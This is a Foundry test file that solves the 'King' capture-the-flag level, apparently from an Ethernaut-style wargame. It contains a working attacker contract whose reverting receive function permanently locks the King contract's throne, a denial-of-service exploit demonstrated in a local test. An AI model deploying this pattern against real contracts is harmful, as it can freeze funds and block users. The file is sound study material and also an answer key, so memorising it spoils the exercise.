/*
* Don't look at the solution without trying yourself first!
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";
import { King } from "@src/09-King/King.sol";

contract AttackerContract {
    error CallerNotOwner();
    error FailedToOverThrowKing();
    error HahaYouHaveBeenHacked();
    error NotEnoughETHToOverthrowKing();

    address private immutable owner;
    King private immutable king;

    constructor(address _king) payable {
        owner = msg.sender;
        king = King(payable(_king));
    }

    modifier onlyOwner() {
        if (msg.sender != owner) revert CallerNotOwner();
        _;
    }

    function attack() external onlyOwner {
        if (address(this).balance < king.prize()) revert NotEnoughETHToOverthrowKing();
        (bool success,) = address(king).call{ value: address(this).balance }("");
        if (!success) revert FailedToOverThrowKing();
    }

    receive() external payable {
        if (tx.origin != owner) revert HahaYouHaveBeenHacked();
    }
}

contract HackKing is Test {
    King public king;
    address public deployer;
    address public attacker;
    uint256 constant CURRENT_KING_PRIZE = 1 ether;

    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");

        vm.prank(deployer);
        vm.deal(deployer, CURRENT_KING_PRIZE);
        king = new King{ value: CURRENT_KING_PRIZE }();
    }

    function testBecomeTheKing() public {
        // hack the contract
        // your code goes here

        vm.startPrank(attacker);
        uint256 overthrowKingPrize = 2 ether;
        vm.deal(attacker, overthrowKingPrize);
        AttackerContract attackerContract = new AttackerContract{ value: overthrowKingPrize }(address(king));
        // we first overthrow the current king (the deployer), by sending a value greater than the current prize
        // using our `AttackerContract`. Our `AttackerContract`'s receive function reverts if the caller
        // (tx.origin) is not the attacker (owner of the `AttackerContract`). This ensures that the previous king
        // can never get back on the throne!
        attackerContract.attack();
        vm.stopPrank();

        assert(king._king() != deployer);
        vm.expectRevert();
        vm.prank(deployer);
        (bool proclamationSuccess,) = address(king).call{ value: 0 ether }("");
        if (!proclamationSuccess) revert();
    }
}
